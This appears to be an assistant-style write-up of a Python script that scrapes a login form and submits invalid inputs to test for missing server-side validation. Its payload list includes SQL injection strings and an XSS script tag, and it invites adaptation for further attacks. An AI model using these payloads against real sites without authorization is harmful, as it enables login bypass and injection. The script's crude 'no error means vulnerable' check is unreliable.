**Python automation script** using **requests** and **BeautifulSoup** to test if a website relies only on **client-side validation** (i.e., missing server-side validation).  

### **🛠 Features of the Script**
✅ **Sends invalid data** to the form (bypassing client-side validation).  
✅ **Detects if the server accepts invalid input** (which indicates weak validation).  
✅ **Can be modified for SQLi, XSS, and other attacks**.  

---

### **📌 Requirements**
Install dependencies:
```bash
pip install requests beautifulsoup4
```

---

### **🚀 Python Script to Test Server-Side Validation**
```python
import requests
from bs4 import BeautifulSoup

# Target URL (Change this to the form submission URL)
TARGET_URL = "https://example.com/login"

# Headers (Simulating a real browser)
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
}

# Invalid input cases to test
PAYLOADS = {
    "email": ["invalid-email", "malicious@<script>alert(1)</script>.com"],
    "password": ["123", "' OR '1'='1", "admin' --"]
}

def extract_form_data(url):
    """Extracts form fields dynamically from the page"""
    response = requests.get(url, headers=HEADERS)
    soup = BeautifulSoup(response.text, "html.parser")
    
    form_data = {}
    for input_tag in soup.find_all("input"):
        name = input_tag.get("name")
        if name:
            form_data[name] = "test"  # Default value
    
    return form_data

def test_bypass_validation():
    """Sends invalid data to test for missing server-side validation"""
    form_data = extract_form_data(TARGET_URL)

    for field, test_values in PAYLOADS.items():
        if field in form_data:
            for value in test_values:
                modified_data = form_data.copy()
                modified_data[field] = value  # Inject invalid data

                print(f"[*] Testing {field} with: {value}")
                response = requests.post(TARGET_URL, data=modified_data, headers=HEADERS)

                if "error" not in response.text.lower():
                    print(f"[!!!] Possible missing server-side validation for: {field}")
                else:
                    print(f"[✔] Server rejected invalid {field}")

if __name__ == "__main__":
    test_bypass_validation()
```

---

### **💡 How It Works**
1. **Extracts all form fields** dynamically from the target page.  
2. **Attempts to submit invalid values** (such as XSS & SQLi payloads).  
3. **Checks the server response** for error messages:
   - If the **server accepts** the invalid input, it **lacks proper validation** ❌.  
   - If the **server rejects** the input, it has validation in place ✔.  

---

### **🔍 Possible Findings**
✅ **Proper Validation** → The server rejects malformed inputs.  
❌ **Weak Validation** → The server accepts invalid values (indicating a vulnerability).  
